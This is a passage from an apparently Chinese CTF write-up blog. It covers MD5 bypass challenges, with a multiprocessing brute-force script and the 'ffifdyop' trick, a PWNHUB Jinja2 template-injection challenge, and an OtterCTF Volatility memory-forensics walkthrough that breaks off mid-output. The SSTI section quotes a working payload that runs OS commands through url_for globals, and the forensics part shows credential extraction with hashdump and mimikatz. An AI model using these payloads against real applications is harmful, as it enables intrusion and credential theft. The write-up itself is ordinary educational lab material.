<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span> (rnds)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,</span><br><span class="line">                                         stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br></pre></td></tr></table></figure>
<p>这个是从网上套用的python脚本，但爆破出的字符串居然输入进去无法符合要求，这让我十分费解，截取的5位字符也和题目要求的一样，我十分疑惑。最后发现只有将代码中的CHARS设置成数字，爆破的串长度设为5的时候才能通过，这里的问题留待解决。<br><img src="https://img-blog.csdnimg.cn/e6262ce58e2f448390d7b79c34afe906.png" alt="在这里插入图片描述"><br>将答案输入后成功进入下一关</p>
<h2 id="Part-3"><a href="#Part-3" class="headerlink" title="Part 3"></a>Part 3</h2><p><img src="https://img-blog.csdnimg.cn/a6f832a8fe1c481ead1280be190be0e1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>来到下一关，界面中只有一个输入框和一个提交按钮，应该要进行注入</p>
<p><img src="https://img-blog.csdnimg.cn/8c958217021a48c494a59475f3dd3df8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>查看源代码后获得提示，这里是跟BJDCTF的某道题目一模一样的，可以用<code>ffifdyop</code>绕过，详细可以参考<a href="https://blog.csdn.net/weixin_51804748/article/details/121336876">[BJDCTF 2020] Easy MD5</a><br>非预期解：观察这两关的地址，一个是md51.php，一个是md52.php，于是这里想到直接跳转到md53.php</p>
<h2 id="Part-4"><a href="#Part-4" class="headerlink" title="Part 4"></a>Part 4</h2><p><img src="https://img-blog.csdnimg.cn/2b7d87b272544a63bc7d9f9b7e8546b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>又是md5比较，直接数组绕过<br><img src="https://img-blog.csdnimg.cn/b272dcb578bb4b308bfa6d53ac993de5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Li2QS5SLg==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>得到flag</strong></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>PWNHUB 5月公开赛 Web</title>
    <url>/2022/05/13/pwnhub5/</url>
    <content><![CDATA[<h1 id="TemplatePlay"><a href="#TemplatePlay" class="headerlink" title="TemplatePlay"></a>TemplatePlay</h1><p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205131450452.png" alt="image-20220513145023318"></p>
<p>题目主页抓包可以看到一个可疑的js文件，判断了ua头是否为admin，我们可以修改一下ua头，然后访问一下链接，这里的<code>string</code>参数应该就是注入点</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205132047760.png" alt="image-20220513204706693"></p>
<p>先用<code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code>找一下内置函数和内置类，这里有很多可以使用的函数</p>
<p><code>&#123;&#123;self._TemplateReference__context.url_for.__globals__.os.popen('ls').read()&#125;&#125;</code>可以直接命令执行</p>
<p><code>find / -iname &quot;fla*&quot; </code>直接找到flag路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sys/devices/pnp0/00:04/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS15/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS6/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS23/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS13/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS31/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS4/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS21/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS11/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS28/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS18/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS9/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS26/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS16/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS7/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS24/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS14/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS5/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS22/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS12/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS30/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS20/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS10/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS29/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS19/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS27/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS17/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS8/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS25/flags</span><br><span class="line">/sys/devices/virtual/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu0/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu0/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu1/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu1/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu2/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu2/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu3/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu3/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu4/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu4/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu5/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu5/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu6/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu6/domain1/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu7/domain0/flags</span><br><span class="line">/proc/sys/kernel/sched_domain/cpu7/domain1/flags</span><br><span class="line">/www/venv/bin/flask</span><br><span class="line">/www/venv/lib/python2.7/site-packages/Flask-1.1.4.dist-info</span><br><span class="line">/www/venv/lib/python2.7/site-packages/flask</span><br><span class="line">/www/config/flag.txt</span><br></pre></td></tr></table></figure>

<p>这里好像输入长度太长会报错500，所以没法反弹shell</p>
<p>最后直接cat读出flag</p>
<p><img src="https://unpkg.com/H4cking2theGate/pic/img/202205132057556.png" alt="image-20220513205727496"></p>
]]></content>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>OtterCTF 内存取证</title>
    <url>/2022/05/15/otterctf/</url>
    <content><![CDATA[<p>最近小小的学习了一下内存取证，装环境搞了整整一天，非常麻烦，在阅读相关资料时偶然看到了一篇WriteUp，是关于<a href="https://otterctf.com/challenges">OtterCTF2018</a>的十三道内存取证题目，用的全部是同一个镜像，考察的知识点非常全面，可以用来熟悉一下volatility的使用，关键是比赛平台居然还开着，正好当作内存取证的一次入门学习</p>
<hr>
<h1 id="What-the-password"><a href="#What-the-password" class="headerlink" title="What the password?"></a>What the password?</h1><p><img src="https://s2.loli.net/2022/06/06/BZr3HTiQya2N9qg.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem imageinfo                  </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/桌面/OtterCTF.vmem)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf80002c430a0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80002c44d00L</span><br><span class="line">                KPCR for CPU 1 : 0xfffff880009ef000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2018-08-04 19:34:22 UTC+0000</span><br><span class="line">     Image local date and time : 2018-08-04 22:34:22 +0300</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目附件是一个raw文件，先用imageinfo查看一下镜像的信息，支持的系统有很多，我们可以试一试，指定profile为第一个Win7SP1x64，然后看看能否成功调用volshell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 volshell</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Current context: System @ 0xfffffa8018d44740, pid=4, ppid=0 DTB=0x187000</span><br><span class="line">Welcome to volshell! Current memory image is:</span><br><span class="line">file:///root/%E6%A1%8C%E9%9D%A2/OtterCTF.vmem</span><br><span class="line">To get help, type &#x27;hh()&#x27;</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; hh()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到正确的镜像系统后，便可以在后面加上<code>--profile=Win7SP1x64</code>来使用后续的命令，第一题需要我们获取这个镜像的用户密码，可以使用hashdump，但得到密码都是哈希加密之后的，使用lsadump或者mimikatz可以得到明文</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940:::</span><br><span class="line">                                                                                                                         </span><br><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 lsadump </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">DefaultPassword</span><br><span class="line">0x00000000  28 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   (...............</span><br><span class="line">0x00000010  4d 00 6f 00 72 00 74 00 79 00 49 00 73 00 52 00   M.o.r.t.y.I.s.R.</span><br><span class="line">0x00000020  65 00 61 00 6c 00 6c 00 79 00 41 00 6e 00 4f 00   e.a.l.l.y.A.n.O.</span><br><span class="line">0x00000030  74 00 74 00 65 00 72 00 00 00 00 00 00 00 00 00   t.t.e.r.........</span><br><span class="line"></span><br><span class="line">DPAPI_SYSTEM</span><br><span class="line">0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............</span><br><span class="line">0x00000010  01 00 00 00 36 9b ba a9 55 e1 92 82 09 e0 63 4c   ....6...U.....cL</span><br><span class="line">0x00000020  20 74 63 14 9e d8 a0 4b 45 87 5a e4 bc f2 77 a5   .tc....KE.Z...w.</span><br><span class="line">0x00000030  25 3f 47 12 0b e5 4d a5 c8 35 cf dc 00 00 00 00   %?G...M..5......</span><br><span class="line"></span><br><span class="line">                                                                                                             </span><br><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 mimikatz</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Module   User             Domain           Password                                </span><br><span class="line">-------- ---------------- ---------------- ----------------------------------------</span><br><span class="line">wdigest  Rick             WIN-LO6FAF3DTFE  MortyIsReallyAnOtter                    </span><br><span class="line">wdigest  WIN-LO6FAF3DTFE$ WORKGROUP </span><br></pre></td></tr></table></figure>

<blockquote>
<p>CTF{MortyIsReallyAnOtter}</p>
</blockquote>
<h1 id="General-Info"><a href="#General-Info" class="headerlink" title="General Info"></a>General Info</h1><p><img src="https://s2.loli.net/2022/06/06/kVKzAInGFy1NSMx.png" alt="img"></p>
<p>第二题要获取主机名和ip地址</p>
<p><strong>ip地址</strong></p>
<p>能获取的ip地址的最快办法就是netscan，查看网络连接</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 netscan </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created</span><br><span class="line">0x7d60f010         UDPv4    0.0.0.0:1900                   *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000</span><br><span class="line">0x7d62b3f0         UDPv4    192.168.202.131:6771           *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:22 UTC+0000</span><br><span class="line">0x7d62f4c0         UDPv4    127.0.0.1:62307                *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000</span><br><span class="line">0x7d62f920         UDPv4    192.168.202.131:62306          *:*                                   2836     BitTorrent.exe 2018-08-04 19:27:17 UTC+0000</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>netscan的结果很多，这里只放了一部分，期中多次出现的<code>192.168.202.131</code>就是ip地址</p>
<p><strong>主机名</strong></p>
<p>主机名的获取方法有两种，第一种是直接在hashdump的显示中可以看到主机名，第二种就是查注册表，这里使用hivelist查注册表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 hivelist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Virtual            Physical           Name</span><br><span class="line">------------------ ------------------ ----</span><br><span class="line">0xfffff8a00377d2d0 0x00000000624162d0 \??\C:\System Volume Information\Syscache.hve</span><br><span class="line">0xfffff8a00000f010 0x000000002d4c1010 [no name]</span><br><span class="line">0xfffff8a000024010 0x000000002d50c010 \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">0xfffff8a000053320 0x000000002d5bb320 \REGISTRY\MACHINE\HARDWARE</span><br><span class="line">0xfffff8a000109410 0x0000000029cb4410 \SystemRoot\System32\Config\SECURITY</span><br><span class="line">0xfffff8a00033d410 0x000000002a958410 \Device\HarddiskVolume1\Boot\BCD</span><br><span class="line">0xfffff8a0005d5010 0x000000002a983010 \SystemRoot\System32\Config\SOFTWARE</span><br><span class="line">0xfffff8a001495010 0x0000000024912010 \SystemRoot\System32\Config\DEFAULT</span><br><span class="line">0xfffff8a0016d4010 0x00000000214e1010 \SystemRoot\System32\Config\SAM</span><br><span class="line">0xfffff8a00175b010 0x00000000211eb010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span><br><span class="line">0xfffff8a00176e410 0x00000000206db410 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT</span><br><span class="line">0xfffff8a002090010 0x000000000b92b010 \??\C:\Users\Rick\ntuser.dat</span><br><span class="line">0xfffff8a0020ad410 0x000000000db41410 \??\C:\Users\Rick\AppData\Local\Microsoft\Windows\UsrClass.dat</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主机名信息在system的那一条记录中，再用<code>-o + 地址 printkey</code> 来查看指定的记录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Legend: (S) = Stable   (V) = Volatile</span><br><span class="line"></span><br><span class="line">----------------------------</span><br><span class="line">Registry: \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">Key name: CMI-CreateHive&#123;2A7FB991-7BBE-4F9D-B91E-7CB51D4737F5&#125; (S)</span><br><span class="line">Last updated: 2018-08-04 19:25:54 UTC+0000</span><br><span class="line"></span><br><span class="line">Subkeys:</span><br><span class="line">  (S) ControlSet001</span><br><span class="line">  (S) ControlSet002</span><br><span class="line">  (S) MountedDevices</span><br><span class="line">  (S) RNG</span><br><span class="line">  (S) Select</span><br><span class="line">  (S) Setup</span><br><span class="line">  (S) Software</span><br><span class="line">  (S) WPA</span><br><span class="line">  (V) CurrentControlSet</span><br><span class="line"></span><br><span class="line">Values:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟进ControlSet001，一路到最后可以看到主机名的value</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Legend: (S) = Stable   (V) = Volatile</span><br><span class="line"></span><br><span class="line">----------------------------</span><br><span class="line">Registry: \REGISTRY\MACHINE\SYSTEM</span><br><span class="line">Key name: ComputerName (S)</span><br><span class="line">Last updated: 2018-06-02 19:23:00 UTC+0000</span><br><span class="line"></span><br><span class="line">Subkeys:</span><br><span class="line"></span><br><span class="line">Values:</span><br><span class="line">REG_SZ                        : (S) mnmsrvc</span><br><span class="line">REG_SZ        ComputerName    : (S) WIN-LO6FAF3DTFE</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CTF{192.168.202.131}</p>
<p>CTF{WIN-LO6FAF3DTFE}</p>
</blockquote>
<h1 id="Play-Time"><a href="#Play-Time" class="headerlink" title="Play Time"></a>Play Time</h1><p><img src="https://s2.loli.net/2022/06/06/dtfg2PaKbTywxvG.png" alt="img"></p>
<p>要找到他玩的游戏，可以用pslist来看看进程，看ip地址可以用netscan</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 pslist</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </span><br><span class="line">------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</span><br><span class="line">0xfffffa8018d44740 System                    4      0     95      411 ------      0 2018-08-04 19:26:03 UTC+0000                                 </span><br><span class="line">0xfffffa801947e4d0 smss.exe                260      4      2       30 ------      0 2018-08-04 19:26:03 UTC+0000                                 </span><br><span class="line">0xfffffa801a0c8380 csrss.exe               348    336      9      563      0      0 2018-08-04 19:26:10 UTC+0000                                                                                             </span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">0xfffffa801b4a7b30 bittorrentie.e         2308   2836     15      337      1      1 2018-08-04 19:27:19 UTC+0000                                 </span><br><span class="line">0xfffffa801b4c9b30 bittorrentie.e         2624   2836     13      316      1      1 2018-08-04 19:27:21 UTC+0000                                 </span><br><span class="line">0xfffffa801b5cb740 LunarMS.exe             708   2728     18      346      1      1 2018-08-04 19:27:39 UTC+0000                                 </span><br><span class="line">0xfffffa801988c2d0 PresentationFo          724    492      6      148      0      0 2018-08-04 19:27:52 UTC+0000                                                                 </span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>其中有个进程LunarMS.exe，可以谷歌搜索一下，发现是个游戏，顺势用netscan查出ip地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 netscan|grep LunarMS</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">0x7d6124d0         TCPv4    192.168.202.131:49530          77.102.199.102:7575  CLOSED           708      LunarMS.exe    </span><br><span class="line">0x7e413a40         TCPv4    -:0                            -:0                  CLOSED           708      LunarMS.exe    </span><br><span class="line">0x7e521b50         TCPv4    -:0                            -:0                  CLOSED           708      LunarMS.exe</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CTF{LunarMS}</p>
<p>CTF{77.102.199.102}</p>
</blockquote>
<h1 id="Name-Game"><a href="#Name-Game" class="headerlink" title="Name Game"></a>Name Game</h1><p><img src="https://s2.loli.net/2022/06/06/9BqVQaOvKG12cIR.png" alt="img"></p>
<p>要找到Lunar-3这个服上的用户名，我们最好把进程给dump下来进行逆向分析，这里也可以在镜像中通过寻找字符串的方式找到和Lunar-3相关记录</p>
<p>这里可以使用工具010editor</p>
<p><img src="https://s2.loli.net/2022/06/06/KSWdo9GJ5w4P8sC.png" alt="img"></p>
<p>可以看到Lunar-3的后面有一个奇怪的字符串<code>0tt3r8r33z3</code>，这个就是用户名</p>
<p>或者也可以在命令行中直接查找</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# strings /root/桌面/OtterCTF.vmem|grep Lunar-3 -C 5 </span><br><span class="line">.&gt;SWqn</span><br><span class="line">Y!F[Wq</span><br><span class="line">disabled</span><br><span class="line">mouseOver</span><br><span class="line">keyFocused</span><br><span class="line">Lunar-3</span><br><span class="line">0tt3r8r33z3</span><br><span class="line">Sound/UI.img/</span><br><span class="line">BtMouseClick</span><br><span class="line">Lunar-4</span><br><span class="line">Lunar-1</span><br><span class="line">--</span><br><span class="line">c+Y\</span><br><span class="line">\b+Y</span><br><span class="line">c+Yt</span><br><span class="line">tb+Y4c+Y</span><br><span class="line">b+YLc+Y</span><br><span class="line">Lunar-3</span><br><span class="line">Lunar-4</span><br><span class="line">L(dNVxdNV</span><br><span class="line">L|eNV</span><br><span class="line">&#123;qf8</span><br><span class="line">q r&quot;r r</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>这里使用strings命令加上grep搜索，<code>-C 5</code>表示查找前后5条记录，同样可以找到可疑字符串</p>
<blockquote>
<p>CTF{0tt3r8r33z3}</p>
</blockquote>
<h1 id="Name-Game-2"><a href="#Name-Game-2" class="headerlink" title="Name Game 2"></a>Name Game 2</h1><p><img src="https://s2.loli.net/2022/06/06/RWjCFQLVHYN17P3.png" alt="img"></p>
<p>这里先用memdump把前面那个LunarMS.exe游戏进程打印出来，进程号PID可以看前面的pslist</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D ./</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">************************************************************************</span><br><span class="line">Writing LunarMS.exe [   708] to 708.dmp</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<p>这个题给了一个16进制的签名，我们用010来搜索其中的片段<code>5A 0C 00</code>，结果非常多，得慢慢找，可以看到这个M0rtyL0L就是角色名</p>
<p><img src="https://s2.loli.net/2022/06/06/RkV45bhpmnXHI1S.png" alt="img"></p>
<p>用hexdump命令也可以查找，结果就不放了，太长了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdump -C 708.dmp |grep <span class="string">&quot;5a 0c 00&quot;</span> -A 3 -B 3</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CTF{M0rtyL0L}</p>
</blockquote>
<h1 id="Silly-Rick"><a href="#Silly-Rick" class="headerlink" title="Silly Rick"></a>Silly Rick</h1><p><img src="https://s2.loli.net/2022/06/06/XpQfvtNCa8xPWVU.png" alt="img"></p>
<p>题目需要获得邮箱密码，又提示说经常复制粘贴，那我们可以用clipboard查看剪贴板</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 clipboard</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Session    WindowStation Format                         Handle Object             Data                                              </span><br><span class="line">---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------</span><br><span class="line">         1 WinSta0       CF_UNICODETEXT                0x602e3 0xfffff900c1ad93f0 M@il_Pr0vid0rs                                    </span><br><span class="line">         1 WinSta0       CF_TEXT                          0x10 ------------------                                                   </span><br><span class="line">         1 WinSta0       0x150133L              0x200000000000 ------------------                                                   </span><br><span class="line">         1 WinSta0       CF_TEXT                           0x1 ------------------                                                   </span><br><span class="line">         1 ------------- ------------------           0x150133 0xfffff900c1c1adc0          </span><br><span class="line">         </span><br></pre></td></tr></table></figure>

<blockquote>
<p>CTF{M@il_Pr0vid0rs}</p>
</blockquote>
<h1 id="Hide-And-Seek"><a href="#Hide-And-Seek" class="headerlink" title="Hide And Seek"></a>Hide And Seek</h1><p><img src="https://s2.loli.net/2022/06/06/7GgWc5UVDl8m6H1.png" alt="img"></p>
<p>这个题目要找到恶意进程名字，我们可以用pstree查看进程树</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali2022)-[~]</span><br><span class="line">└─# vol.py -f /root/桌面/OtterCTF.vmem --profile=Win7SP1x64 pstree    </span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Name                                                  Pid   PPid   Thds   Hnds Time</span><br><span class="line">-------------------------------------------------- ------ ------ ------ ------ ----</span><br><span class="line"> 0xfffffa801b27e060:explorer.exe                     2728   2696     33    854 2018-08-04 19:27:04 UTC+0000</span><br><span class="line">. 0xfffffa801b486b30:Rick And Morty                  3820   2728      4    185 2018-08-04 19:32:55 UTC+0000</span><br><span class="line">.. 0xfffffa801a4c5b30:vmware-tray.ex                 3720   3820      8    147 2018-08-04 19:33:02 UTC+0000</span><br><span class="line">. 0xfffffa801b2f02e0:WebCompanion.e                  2844   2728      0 ------ 2018-08-04 19:27:07 UTC+0000</span><br><span class="line">. 0xfffffa801a4e3870:chrome.exe                      4076   2728     44   1160 2018-08-04 19:29:30 UTC+0000</span><br><span class="line">.. 0xfffffa801a4eab30:chrome.exe                     4084   4076      8     86 2018-08-04 19:29:30 UTC+0000</span><br><span class="line">.. 0xfffffa801a5ef1f0:chrome.exe                     1796   4076     15    